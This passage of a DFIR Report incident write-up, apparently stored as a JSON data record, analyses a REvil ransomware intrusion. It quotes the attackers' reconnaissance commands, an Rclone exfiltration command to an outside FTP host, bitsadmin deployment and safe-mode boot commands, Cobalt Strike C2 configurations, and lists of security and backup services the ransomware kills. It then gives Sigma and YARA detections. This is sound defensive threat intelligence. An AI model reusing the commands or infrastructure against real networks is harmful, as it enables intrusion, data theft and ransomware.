HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca Privilege Escalation After completing LDAP discovery ( BloodHound ), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including: UAC-TokenMagic Invoke-SluiBypass Defense Evasion About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers. Process injection was used multiple times across the environment using Cobalt Strike Beacons. Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs. The GPO was named \u201cnew\u201d. Credential Access Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon. Discovery Initial discovery by the IcedID malware occurred within minutes of execution: cmd.exe /c chcp >&2 WMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig.exe ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net.exe net group \"Domain Admins\" /domain A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead. \"DistinguishedName\": \"CN=Terminal Server License Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Incoming Forest Trust Builders,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Account Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Cert Publishers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Server Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Storage Replica Administrators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Hyper-V Administrators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Remote Management Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Access Control Assistance Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RDS Management Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RDS Endpoint Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Event Log Readers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RDS Remote Access Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Certificate Service DCOM Access,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Performance Log Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Cryptographic Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Distributed COM Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Network Configuration Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Performance Monitor Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Remote Desktop Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Replicator,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Backup Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Print Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Infra,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Security Administrator,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Compliance Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Discovery Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Records Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=UM Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Public Folder Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=View-Only Organization Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=DnsUpdateProxy,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Recipient Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Protected Users,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Cloneable Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Enterprise Key Admins,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Key Admins,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Guests,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Read-only Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Computers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Users,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted. Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity. AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name. cmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv Lateral Movement For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike. Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service. On other systems, PowerShell was used with the same remote service execution. To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment. Collection The Rclone utility was used to collect information from file shares and to exfiltrate the data. svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName Command and Control IcedID : cikawemoret34.space 206.189.10.247:80 nomovee.website 161.35.109.168:443 JA3: a0e9f5d64349fb13191bc781f81f42e1 JA3s: ec74a5c51106f0419184d0dd08fb05bc Certificate :[ e0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43 ] Not Before: 2021/03/11 02:06:51 Not After: 2022/03/11 02:06:51 Issuer Org: Internet Widgits Pty Ltd Subject Common: localhost Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike: 45.86.163.78:443 cloudmetric.online JA3:a0e9f5d64349fb13191bc781f81f42e1 JA3s: ae4edc6faf64d08308082ad26be60767 Certificate: [ b9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3 ] Not Before: 2021/02/27 06:45:42 Not After: 2021/05/28 07:45:42 Issuer Org: Let's Encrypt Subject Common: cloudmetric.online [ cloudmetric.online ] Public Algorithm: rsaEncryption Cobalt Config: { \"x64\": { \"config\": { \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\", \"Beacon Type\": \"0 (HTTP)\", \"Method 2\": \"POST\", \"Polling\": 48963, \"Jitter\": 24, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\", \"Method 1\": \"GET\", \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\", \"Port\": 80 }, \"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\", \"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\", \"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\", \"time\": 1615840900656.6 }, \"x86\": { \"config\": { \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\", \"Beacon Type\": \"0 (HTTP)\", \"Method 2\": \"POST\", \"Polling\": 48963, \"Jitter\": 24, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\", \"Method 1\": \"GET\", \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\", \"Port\": 80 }, \"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\", \"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\", \"md5\": \"bbc6592c67d233640a9ca0d0d915003c\", \"time\": 1615840895189 } } 195.189.99.74 smalleststores.com JA3: 72a589da586844d7f0818ce684948eea JA3s: ae4edc6faf64d08308082ad26be60767 Certificate: [ 14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df ] Not Before: 2021/03/11 11:02:43 Not After: 2021/06/09 12:02:43 Issuer Org: Let's Encrypt Subject Common: smalleststores.com [ smalleststores.com ] Public Algorithm: rsaEncryption Cobalt Config: { \"x86\": { \"config\": { \"Method 1\": \"GET\", \"Method 2\": \"GET\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\", \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\", \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 59713, \"Jitter\": 41, \"Port\": 443, \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\", \"HTTP Method Path 2\": \"/OWA/\" }, \"md5\": \"88365eb3d504f570f22d76f777ab2caf\", \"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\", \"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\", \"time\": 1615846680369.8 }, \"x64\": { \"config\": { \"Method 1\": \"GET\", \"Method 2\": \"GET\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\", \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\", \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 59713, \"Jitter\": 41, \"Port\": 443, \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\", \"HTTP Method Path 2\": \"/OWA/\" }, \"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\", \"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\", \"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\", \"time\": 1615846684589 } } Exfiltration Data that was collected from the domain was exfiltrated to a remote server at: 45.147.160.5:443 Impact For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems. C:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam . Not remember seeing these before in REvil ransomware samples. \ud83e\udd14 So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026 @demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021 See below for -smode execution: The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine. The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents. We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation. \ud83c\udd95 #REvil v2.05 -smode switch configures OS to boot into safe mode w/ networking via: (pre-Vista) bootcfg /raw /a /safeboot:network /id 1 or (Vista+) bcdedit /set {current} safeboot network configures auto-lognn via WinLogon \ud83d\udd11 w/ 'DTrump4ever' password \u2014 R3MRUM (@R3MRUM) March 26, 2021 After rebooting out of Safe Mode, you are left with the following desktop: On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files. C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer The threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here\u2019s a few screenshots from the website. With the help of @hatching_io ( https://tria.ge/) we were able to parse the config from the ransomware sample. Campaign ID (sub): 7114 net: false List of processes to kill (prc) oracle klnagent mydesktopqos infopath BackupExtender powerpnt outlook BackupAgent Smc sql ccSvcHst BackupUpdater Rtvscan winword kavfsscs ocssd isqlplussvc visio ShadowProtectSvc tbirdconfig TSSchBkpService dbeng50 ccSetMgr agntsvc Sage.NA.AT_AU.SysTray dbsnmp thebat onenote AmitiAvSrv wordpad msaccess avgadmsv thunderbird BackupMaint Microsoft.exchange.store.worker.exe CarboniteUI excel SPBBCSvc LogmeInBackupService encsvc ocomm sqbcoreservice NSCTOP mydesktopservice kavfs kavfswp ocautoupds mspub xfssvccon DLOAdminSvcu synctime lmibackupvssservice firefox steam dlomaintsvcu List of services to kill Telemetryserver \"Sophos AutoUpdate Service\" sophos Altaro.Agent.exe mysqld MSSQL$MSGPMR \"SophosFIM\" \"Sophos Web Control Service\" SQLWriter svcGenericHost AltiBack \"SQLServer Analysis Services (MSSQLSERVER)\" BackupExecAgentAccelerator \"StorageCraft ImageReady\" SQLTELEMETRY AzureADConnectAuthenticationAgent ntrtscan ds_notifier TeamViewer \"StorageCraft Raw Agent\" \"StorageCraft Shadow Copy Provider\" SQLTELEMETRY$SQLEXPRESS VeeamHvIntegrationSvc AltiCTProxy MsDtsServer130 ViprePPLSvc McAfeeFramework MSSQL$QM \"swi_service\" \"ThreadLocker\" ofcservice AUService sophossps AzureADConnectHealthSyncMonitor Altaro.OffsiteServer.UI.Service.exe \"SAVAdminService\" ds_monitor ALTIVRM SSASTELEMETRY TmCCSF MsDtsServer110 \"Sophos MCS Client\" TMBMServer SBAMSvc mfewc \"Sophos System Protection Service\" MSSQLFDLauncher$TESTBACKUP02DEV VeeamDeploymentService masvc backup MSSQL$SQLEXPRESS AltiPhoneServ MSSQLServerOLAPService SSISTELEMETRY130 VeeamEndpointBackupSvc mepocs Altaro.UI.Service.exe \"ds_agent\" HuntressUpdater MSSQLFDLauncher \"Sophos File Scanner Service\" SQLAgent$MSGPMR ADSync KaseyaAgent ReportServer MSSQLFDLauncher$SQLEXPRESS MSSQL$HPWJA KaseyaAgentEndpoint VeeamTransportSvc \"ds_monitor\" mfevtp MSSQLTESTBACKUP02DEV SQLTELEMETRY$MSGPMR ThreadLocker MSSQLServerADHelper100 veeam tmlisten AzureADConnectHealthSyncInsights \"swi_filter\" MsDtsServer120 ProtectedStorage VeeamDeploySvc memtas ds_agent VeeamMountSvc HuntressAgent SQLAgent$SQLEXPRESS bedbg MSSQLSERVER \"ofcservice\" VipreAAPSvc \"Sophos Endpoint Defense Service\" KACHIPS906995744173948 DsSvc MSSQLLaunchpad$SQLEXPRESS msseces macmnsvc LTService Code42Service Altaro.HyperV.WAN.RemoteService.exe LTSvcMon MSSQL$SQLEXPRESSADV \"SAVService\" Altaro.OffsiteServer.Service.exe \"Sage 100cloud Advanced 2020 (9920)\" Altaro.SubAgent.exe mfemms \"TeamViewer\" \"SQLServer Reporting Services (MSSQLSERVER)\" VSS sql Altaro.SubAgent.N2.exe \"SQLServer Integration Services 12.0\" SQLSERVERAGENT vss \"Sophos Safestore Service\" klnagent \"Sage.NA.AT_AU.Service\" MBAMService \"Sophos Health Service\" SQLBrowser MySQL \"ProtectedStorage\" \"Sophos Clean Service\" \"Sage 100c Advanced 2017 (9917)\" \"SntpService\" VeeamNFSSvc KAVFS SQLEXPRESSADV KAENDCHIPS906995744173948 sppsvc Amsp psqlWGE Microsoft.exchange.store.worker.exe kavfsscs \"Amsp\" sqlservr Altaro.DedupService.exe svc$ \"ds_notifier\" \"Sophos Device Control Service\" AzureADConnectAgentUpdater AltiFTPUploader \"Sophos MCS Agent\" Triage sandbox run of the executable without smode: IOCs Network 45.86.163.78|80 45.86.163.78|443 45.86.163.78|8080 195.189.99.74|80 195.189.99.74|443 195.189.99.74|8080 206.189.10.247|80 161.35.109.168|443 smalleststores.com cloudmetric.online cikawemoret34.space nomovee.website File skull-x64.dat 5c3a6978bb960d8fbccd117ddcc3ca10 17424cfeb756e231bea6d1363151a83af142ba6f 59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc Ciocca.dll 296f1098a3a8cfb7e07808ee08361495 7d903f87fd305f1c93ec420848fd6e5aeb018d59 b1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388 license.dat 6f208841cfd819c29a7cbc0a202bd7a3 0febc376cc066bb668f1a80b969ed112da8e871c 45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865 DomainName.dll c8fab46c4fd61c5f138fb151638c35e1 c4830cbf3a3044f6e50cd60127ff5681f8ee4bbf 64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f DomainName.exe af94ccb62f97700115a219c4b7626d22 bb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7 2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c svchost.exe (rclone) fcfcf1e45e8d5cdca0450b8dc90754b68e8e4673 538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5 AdFind.exe cb198869ca3c96af536869e71c54dd9d83afbee6 56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed Detections Network ETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2 ET DNS Query to a *.top domain ET POLICY OpenSSL Demo CA - Internet Widgits Pty Sigma https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml https://github.com/Neo23x0/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_adfind.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_office_shell.yml Custom rule thanks to @0xThiebaut title: Sodinokibi Ransomware Registry Key id: 9fecd354-77f0-498e-a611-c963970e7bca description: Detects the creation of Sodinokibi (aka REvil) registry keys status: experimental references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ - https://twitter.com/malwrhunterteam/status/1372648463553462279 tags: - attack.persistence - attack.t1547.001 date: 2021/03/29 author: Maxime THIEBAUT (@0xThiebaut) logsource: category: registry_event product: windows detection: selection: TargetObject|contains: - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca' - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit' condition: selection level: high Custom rule thanks to @lindodapoet_ title: Svchost data exfiltration id: dc4249c9-d96f-401b-a92b-caa6208c097d status: experimental description: Detects possible data exfiltration via svchost references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ author: Nclose date: 2021/03/29 tags: - attack.exfiltration - attack.t1048 logsource: product: windows service: process_creation detection: selection: CommandLine|contains: 'copy' Image|endswith: '\\svchost.exe' condition: selection falsepositives: - Unknown level: high Custom rules and rule ideas written by @BlackMatter23 It was the most time consuming #ThreatIntel report in my career\ud83d\ude24 #REvil TTPs hunting campaign is finished: \u2013 37 detection ideas \u2013 81 detection rules (Windows/Sysmon/EDR) plus BloodHound & BITS jobs: https://t.co/GoDYfvaFJF Excellent work @TheDFIRReport team! #threathunting pic.twitter.com/Tw1OyIMCki \u2014 Vadim Khrykov (@BlackMatter23) August 19, 2021 Yara /* YARA Rule Set Author: The DFIR Report Date: 2021-03-29 Identifier: files Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule Sodinokibi_032021 { meta: description = \"files - file DomainName.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-03-21\" hash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\" strings: $s1 = \"vmcompute.exe\" fullword wide $s2 = \"vmwp.exe\" fullword wide $s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii $s4 = \"bcdedit /set {current} safeboot network\" fullword ascii $s5 = \"7+a@P>:N:0!F$%I-6MBEFb M\" fullword ascii $s6 = \"jg:\\\"\\\\0=Z\" fullword ascii $s7 = \"ERR0R D0UBLE RUN!\" fullword wide $s8 = \"VVVVVPQ\" fullword ascii $s9 = \"VVVVVWQ\" fullword ascii $s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */ $s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii $s12 = \"9RFIT\\\"&\" fullword ascii $s13 = \"jZXVf9F\" fullword ascii $s14 = \"tCWWWhS=@\" fullword ascii $s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */ $s16 = \"JJwK9Zl\" fullword ascii $s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii $s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */ $s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */ $s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */ condition: uint16(0) == 0x5a4d and filesize < 400KB and ( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them ) } rule icedid_032021_1 { meta: description = \"files - file skull-x64.dat\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-03-21\" hash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\" strings: $s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */ $s2 = \"PstmStr\" fullword ascii $s3 = \"mRsx0k/\" fullword wide $s4 = \"D$0lzK\" fullword ascii $s5 = \"A;Zts}H\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 100KB and ( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and pe.exports(\"update\") ) or all of them ) } rule icedid_032021_2 { meta: description = \"1 - file license.dat\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-03-21\" hash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\" strings: $s1 = \"+ M:{`n-\" fullword ascii $s2 = \"kwzzdd\" fullword ascii $s3 = \"w5O- >z\" fullword ascii $s4 = \"RRlK8n@~\" fullword ascii $s5 = \"aQXDUkBC\" fullword ascii $s6 = \"}i.ZSj*\" fullword ascii $s7 = \"kLeSM?\" fullword ascii $s8 = \"qmnIqD\\\")P\" fullword ascii $s9 = \"aFAeU!,\" fullword ascii $s10 = \"Qjrf\\\"Q\" fullword ascii $s11 = \"PTpc,!P#\" fullword ascii $s12 = \"r@|JZOkfmT2\" fullword ascii $s13 = \"aPvBO,4\" fullword ascii $s14 = \">fdFhl^S8Z\" fullword ascii $s15 = \"[syBE0\\\\\" fullword ascii $s16 = \"`YFOr.JH\" fullword ascii $s17 = \"C6ZVVF j7}\" fullword ascii $s18 = \"LPlagce\" fullword ascii $s19 = \"NLeF_-e`\" fullword ascii $s20 = \"HRRF|}O\" fullword ascii condition: uint16(0) == 0x43da and filesize < 1000KB and 8 of them } MITRE Spearphishing Attachment - T1566.001 User Execution - T1204 Windows Management Instrumentation - T1047 Process Injection - T1055 Domain Trust Discovery - T1482 Domain Account - T1087.002 System Information Discovery - T1082 System Network Configuration Discovery - T1016 Security Software Discovery - T1518.001 SMB/Windows Admin Shares - T1021.002 Remote Desktop Protocol - T1021.001 Commonly Used Port - T1043 Application Layer Protocol - T1071 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002 Data Encrypted for Impact - T1486 Malicious File - T1204.002 Command and Scripting Interpreter - T1059 PowerShell - T1059.001 Scheduled Task - T1053.005 Remote System Discovery - T1018 Rundll32 - T1218.011 Internal case # 1051 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Bazar Drops the Anchor Trickbot Brief: Creds and Beacons Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 0
  },
  {
    "url": "https://thedfirreport.com/2021/03/08/bazar-drops-the-anchor/",
    "title": "Bazar Drops the Anchor \u2013 The DFIR Report",
